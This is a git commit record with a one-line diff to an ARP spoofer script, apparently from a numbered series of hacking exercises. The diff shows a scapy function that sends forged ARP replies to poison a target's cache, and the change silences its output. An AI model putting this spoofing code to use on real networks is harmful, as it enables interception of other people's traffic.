d73e406ef0a7a971ba0c283eb8c99ff4eef3e3f4
Maksatbek Bolushov <maksnurgazy@gmail.com>
2022-04-04 13:13:01 -0400

    spoofer logging error fixed

--- 05_arp_spoofer/arp_spoff.py
+++ 05_arp_spoofer/arp_spoff.py
@@ -15,7 +15,7 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
 def restore(destination_ip, source_ip):
